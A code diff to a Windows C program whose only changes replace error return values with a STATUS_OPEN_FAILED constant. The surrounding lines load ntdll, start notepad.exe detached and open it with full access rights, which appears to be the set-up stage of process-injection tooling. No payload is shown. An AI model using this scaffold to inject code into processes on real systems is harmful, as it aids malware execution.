@@ -4,6 +4,7 @@
 // Definitions
 //
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#define STATUS_OPEN_FAILED  0xC0000136
 
 typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
 typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
@@ -45,7 +46,7 @@ INT main() {
 		FreeLibrary(hNtdll);
 	}
 	else {
-		return ERROR_MOD_NOT_FOUND;
+		return STATUS_OPEN_FAILED;
 	}
 
 	//
@@ -74,12 +75,12 @@ INT main() {
 
 	if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
 		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
-		return ERROR_CREATE_FAILED;
+		return STATUS_OPEN_FAILED;
 	}
 
 	dwPid = processInformation.dwProcessId;
 	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
-		lRetVal = ERROR_OPEN_FAILED;
+		lRetVal = STATUS_OPEN_FAILED;
 		goto Cleanup;
 	}
 
